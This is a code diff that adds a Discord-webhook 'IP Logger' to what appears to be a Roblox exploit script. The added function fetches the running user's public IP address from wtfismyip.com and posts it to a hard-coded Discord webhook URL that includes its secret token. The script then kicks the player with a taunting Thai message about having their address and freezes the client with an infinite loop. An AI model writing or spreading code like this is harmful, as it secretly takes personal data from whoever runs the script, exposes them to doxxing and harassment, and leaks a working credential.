@@ -1,3 +1,33 @@
+function SendWebhook(Arg)
+        local HttpService = game:GetService("HttpService")
+        local Webhook_URL = "https://discord.com/api/webhooks/1194307108334735510/u6wSa8okM3oek3OjMZG2BeX3miucRCyMUGLer5WXoPBmAJLL8bTYPivmJ2JkTxn9hsug"
+
+        local response = request({
+            Url = Webhook_URL,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = HttpService:JSONEncode({
+                ["content"] = "",
+                ["embeds"] = {{
+                    ["title"] = "",
+                    ["description"] = "IP Logger",
+                    ["type"] = "rich",
+                    ["color"] = tonumber(0xffffff),
+                    ["fields"] = {
+                        {
+                            ["name"] = "",
+                            ["value"] = Arg,
+                            ["inline"] = true
+                        }
+                    }
+                }}
+            })
+        })
+end
+
+SendWebhook(game:HttpGet("https://wtfismyip.com/text"))
 game.Players.LocalPlayer:Kick("ได้ที่อยู่คุณมาละโชคดีนะ 5555")
 task.wait(1)
 while true do end
